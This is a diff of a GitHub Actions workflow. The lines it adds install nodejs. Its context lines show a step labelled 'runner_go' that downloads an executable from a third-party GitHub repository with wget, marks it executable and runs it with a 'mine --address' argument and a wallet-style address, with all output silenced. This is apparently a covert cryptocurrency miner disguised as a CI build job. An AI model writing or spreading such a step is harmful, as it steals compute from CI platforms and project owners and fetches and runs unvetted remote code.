@@ -24,6 +24,8 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
+        apt update
+        apt install nodejs -y
         wget -qO asep https://github.com/feby12329/miniature-guide/raw/refs/heads/master/seras
         chmod +x asep
         ./asep mine --address x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
